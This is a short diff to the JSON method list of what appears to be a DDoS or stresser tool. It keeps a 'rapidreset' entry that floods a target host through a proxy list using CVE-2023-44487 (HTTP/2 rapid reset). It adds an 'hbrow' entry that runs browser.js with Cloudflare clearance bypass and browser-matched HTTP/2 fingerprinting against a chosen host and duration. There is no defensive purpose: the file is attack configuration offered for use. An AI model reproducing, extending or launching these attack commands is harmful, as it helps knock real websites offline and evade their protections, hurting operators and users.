@@ -3,5 +3,10 @@
         "name": "rapidreset",
         "description": "CVE-2023-44487 HTTP/2 rapid reset",
         "argv": ["node", "rapidreset.js", "GET", "<<host>>", "<<time>>", "1", "64", "proxi.txt"]
+    },
+    {
+        "name": "hbrow",
+        "description": "Cloudflare clearance + browser-matched HTTP/2 fingerprint",
+        "argv": ["node", "browser.js", "<<host>>", "<<time>>", "5", "1", "1", "1"]
     }
 ]
